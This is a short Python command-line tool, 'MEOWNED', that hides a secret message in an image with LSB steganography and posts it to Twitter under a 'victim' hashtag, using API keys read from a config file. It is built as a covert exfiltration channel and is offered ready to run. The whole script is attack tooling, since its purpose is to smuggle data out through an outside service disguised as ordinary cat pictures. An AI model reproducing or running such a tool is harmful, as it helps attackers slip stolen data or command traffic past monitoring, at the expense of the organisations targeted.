#!/usr/bin/python3
# """MEOWNED (MEssages Over tWitter Exfiltrating Data)"""
"""pip3 install python-twitter"""
"""pip3 install Stegano"""
"""pip3 install pyyaml"""

import sys
import yaml
import twitter
from stegano import lsb

if len(sys.argv) != 4:
    sys.exit('Usage: meopwn_cli [victim_hashtag] [image to tweet] [secret message]')

# Import YAML
with open("conf.yaml", 'r') as stream:
    try:
        conf = yaml.load(stream)
    except yaml.YAMLError as exc:
        sys.exit("Error: Couldn't parse configuration file, check if conf.yaml exists.")

# Twitter API handler
api = twitter.Api(consumer_key=conf['twitter']['consumer_key'], 
    consumer_secret=conf['twitter']['consumer_secret'], 
    access_token_key=conf['twitter']['access_token_key'], 
    access_token_secret=conf['twitter']['access_token_secret'])

# Verify API credentials with twitter
try:
    api.VerifyCredentials()
    print("Twitter credentials are valid.")
except twitter.error.TwitterError as exc:
    sys.exit("Error: Couldn't authenticate with Twitter.")

# Hide the secret message
secret = lsb.hide("./source-imgs/" + sys.argv[2], sys.argv[3])
secret.save("./output-imgs/" + sys.argv[2])

# Post message to Twitter
# status = api.PostUpdate( "CCC (Covert Cat Channel): ONLINE " + "#" + sys.argv[1],)
# print(status.text)

# Post image to Twitter
print("Tweeting image...")
status = api.PostMedia( "meow " + "#" + sys.argv[1], "./output-imgs/" + sys.argv[2])
print(status.text)

# clear_message = lsb.reveal("./output-imgs/" + sys.argv[2])
# print (clear_message)